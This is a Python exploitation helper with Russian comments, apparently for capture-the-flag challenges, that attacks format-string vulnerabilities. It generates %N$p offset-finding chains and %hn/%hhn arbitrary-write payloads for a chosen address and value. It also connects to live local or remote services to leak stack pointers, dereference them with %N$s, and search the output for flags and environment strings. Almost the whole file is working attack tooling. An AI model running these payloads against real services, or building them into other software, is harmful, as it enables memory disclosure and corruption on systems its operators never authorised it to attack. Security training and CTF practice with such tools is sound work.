#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
fmtstr.py — помощник для format string.

  python fmtstr.py find --count 40          # набор %N$p для поиска оффсета
  python fmtstr.py leak --index 7           # %7$p
  python fmtstr.py write --addr 0x404060 --value 0x1337 --index 10
  python fmtstr.py write --addr 0x404060 --value 0x1337 --index 10 --size hh
  python fmtstr.py scan --local "./vuln"    # сразу прогнать %1..%40$p по сервису
  python fmtstr.py scan --connect h:1337 --deref   # и попробовать %N$s там, где указатель
  python fmtstr.py auto --connect h:1337    # перебрать %1..%40$s, искать флаг/строки

Печатает готовый payload как bytes-literal и hex.
`scan` работает с живым сервисом: показывает, на каком индексе что лежит,
подсвечивает ASCII и пробует читать строки по указателям (`--deref`).
"""
from __future__ import annotations

# Windows: консоль/pipe не должны падать на Unicode (—, →, «», █).
try:
    import sys as _sys
    for _stream in (_sys.stdout, _sys.stderr):
        _stream.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass

import argparse
import os
import re
import socket
import struct
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import common  # noqa: E402
import oracle  # noqa: E402  (Conn/ProcConn — общий транспорт)


def ascii_le(value: int, size: int = 8) -> str:
    """Попытка прочитать значение как ASCII (little-endian)."""
    if value < 0x1000:
        return ""
    raw = value.to_bytes(size, "little").rstrip(b"\x00")
    if len(raw) < 3:
        return ""
    ok = sum(32 <= c < 127 for c in raw)
    if ok / len(raw) < 0.85:
        return ""
    return raw.decode("ascii", "replace")


def classify(value: int) -> str:
    if value == 0:
        return "ноль"
    if value < 0x100:
        return f"малое число ({value})"
    if 0x400000 <= value < 0x600000:
        return "адрес бинарника (non-PIE?)"
    if 0x5500000000 <= value <= 0x5700000000:
        return "PIE/куча"
    if 0x7F0000000000 <= value <= 0x7FFFFFFFFFFF:
        return "libc/стек? (проверь окружение)"
    if 0xFFFF000000000000 <= value:
        return "отрицательное/канарейка?"
    return ""


def open_conn(args):
    if args.local:
        return oracle.ProcConn(args.local)
    host, _, port = args.connect.rpartition(":")
    if not host or not port.isdigit():
        raise SystemExit("--connect должен быть host:port")
    return oracle.Conn(socket.create_connection((host, int(port)), timeout=args.timeout))


def scan(args):
    """Один проход %N$p: собрать указатели, подсветить ASCII, опционально %N$s."""
    indexes = list(range(args.start, args.start + args.count))
    payload = args.marker + args.sep + args.sep.join(f"%{i}$p" for i in indexes) + "\n"

    conn = open_conn(args)
    conn.read_quiet()  # баннер
    conn.send(payload.encode())
    data = conn.read_quiet()
    conn.close()
    text = data.decode("utf-8", "replace")
    if args.marker and args.marker in text:
        text = text.split(args.marker, 1)[1]
    elif "\n" in text.strip():
        text = text  # баннер мог содержать 0x-адреса; берём хвост ниже
    tokens = re.findall(r"0x[0-9a-fA-F]+|\(nil\)", text)
    if len(tokens) > len(indexes):
        tokens = tokens[-len(indexes):]  # ответ обычно в конце
    if not tokens:
        print("[-] ни одного значения. Что пришло:")
        print(text[:1500])
        return

    found = []
    for idx, tok in zip(indexes, tokens):
        if tok == "(nil)":
            continue
        val = int(tok, 16)
        found.append((idx, val))
    if not found:
        print("[-] ни одного значения. Возможно, вывод обрезан или формат не применился.")

    print(f"[+] индексов с данными: {len(found)}")
    for idx, val in found:
        note = classify(val)
        asc = ascii_le(val)
        extra = f"  ascii={asc!r}" if asc else ""
        print(f"  %{idx}$p = 0x{val:016x}  {note}{extra}")

    candidates = [idx for idx, val in found if val >= 0x400000]
    if args.deref and candidates:
        print(f"\n[+] пробую %N$s по {min(len(candidates), args.deref_max)} индексам")
        for idx in candidates[:args.deref_max]:
            try:
                c = open_conn(args)
                c.read_quiet()
                c.send(f"%{idx}$s\n".encode())
                chunk = c.read_quiet()
                c.close()
            except OSError:
                print(f"  %{idx}$s — соединение упало (индекс не строка?)")
                continue
            body = chunk.decode("utf-8", "replace").strip()
            printable = sum(32 <= ord(ch) < 127 or ch in "\r\n\t" for ch in body) / max(1, len(body))
            if body and printable > 0.9:
                print(f"  %{idx}$s -> {body[:200]!r}")
                for f in common.FlagGrabber().feed(chunk):
                    print("   [!!!] ФЛАГ:", f)
                if body.startswith("/") or "PATH=" in body or "=" in body:
                    print("   ^ похоже на строку из окружения/файла")


def auto_scan(args):
    """Перебрать %N$s по всем индексам и вытащить читаемые строки.

    Каждый индекс — на новом соединении: сервис может падать на плохом
    указателе, и тогда остальные индексы не должны пострадать.
    """
    indexes = range(args.start, args.start + args.count)
    hits = []
    for idx in indexes:
        payload = f"%{idx}$s\n"
        try:
            conn = open_conn(args)
            conn.read_quiet()
            conn.send(payload.encode())
            chunk = conn.read_quiet()
            conn.close()
        except OSError:
            print(f"  %{idx}$s — соединение упало")
            continue
        body = chunk.decode("utf-8", "replace").replace(payload.strip(), "").strip()
        if not body or body in ("(nil)", "null", "(null)", "*"):
            continue
        printable = sum(32 <= ord(ch) < 127 or ch in "\r\n\t" for ch in body) / len(body)
        flags = common.FlagGrabber().feed(chunk)
        if flags:
            print(f"  %{idx}$s -> {body[:200]!r}")
            print(f"   [!!!] ФЛАГ: {' | '.join(flags)}")
            hits.append((idx, body, flags))
        elif printable > 0.85 and len(body) >= 4:
            print(f"  %{idx}$s -> {body[:200]!r}")
            hits.append((idx, body, []))
    if hits:
        print(f"\n[+] всего индексов с текстом: {len(hits)}")
        print("[i] если сервис печатает адрес стека — подставь его как аргумент "
              "fmtstr write / отправь %N$s вручную")
    else:
        print("[-] %N$s ничего не дал. Попробуй scan --deref и marker/sep под свой сервис.")


def p64(x):
    return struct.pack("<Q", x)


def p32(x):
    return struct.pack("<I", x)


def main():
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)

    f = sub.add_parser("find")
    f.add_argument("--count", type=int, default=40)
    f.add_argument("--start", type=int, default=1)

    l = sub.add_parser("leak")
    l.add_argument("--index", type=int, required=True)
    l.add_argument("--size", default="p", choices=["p", "x", "s"])

    w = sub.add_parser("write")
    w.add_argument("--addr", type=lambda x: int(x, 0), required=True)
    w.add_argument("--value", type=lambda x: int(x, 0), required=True)
    w.add_argument("--index", type=int, required=True)
    w.add_argument("--size", default="hn", choices=["hn", "hh"])
    w.add_argument("--bits", type=int, default=64, choices=[32, 64])

    s = sub.add_parser("scan")
    s.add_argument("--connect", help="host:port сервиса")
    s.add_argument("--local", help="локальная команда процесса")
    s.add_argument("--start", type=int, default=1)
    s.add_argument("--count", type=int, default=40)
    s.add_argument("--marker", default="AA", help="метка, чтобы найти начало эха")
    s.add_argument("--sep", default="|")
    s.add_argument("--deref", action="store_true", help="пробовать %%N$s по указателям")
    s.add_argument("--deref-max", type=int, default=12)
    s.add_argument("--timeout", type=float, default=3.0)

    a = sub.add_parser("auto", help="перебрать %%N$s по всем индексам и искать флаг/строки")
    a.add_argument("--connect", help="host:port сервиса")
    a.add_argument("--local", help="локальная команда процесса")
    a.add_argument("--start", type=int, default=1)
    a.add_argument("--count", type=int, default=40)
    a.add_argument("--timeout", type=float, default=3.0)

    args = ap.parse_args()

    if args.cmd == "auto":
        auto_scan(args)
        return

    if args.cmd == "scan":
        scan(args)
        return

    if args.cmd == "find":
        payload = ".".join(f"%{i}$p" for i in range(args.start, args.start + args.count))
        print(payload)
        return

    if args.cmd == "leak":
        print(f"%{args.index}${args.size}")
        return

    # write
    pack = p64 if args.bits == 64 else p32
    addr = pack(args.addr)
    if args.size == "hn":
        value = args.value & 0xFFFF
        fmt = f"%{value}c%{args.index}$hn".encode()
        payload = fmt + addr
    else:
        low = args.value & 0xFF
        high = (args.value >> 8) & 0xFF
        # две записи: младший байт по addr, старший по addr+1
        a1, a2 = addr, pack(args.addr + 1)
        # сортируем по значению, чтобы не печатать отрицательное число
        first, second = (low, high) if low <= high else (high, low)
        f1 = f"%{first}c%{args.index}$hhn".encode()
        f2 = f"%{second - first}c%{args.index + 1}$hhn".encode()
        payload = f1 + f2 + (a1 if low <= high else a2) + (a2 if low <= high else a1)

    print("[+] length:", len(payload))
    print("[+] python:", repr(payload))
    print("[+] hex:   ", payload.hex())


if __name__ == "__main__":
    main()
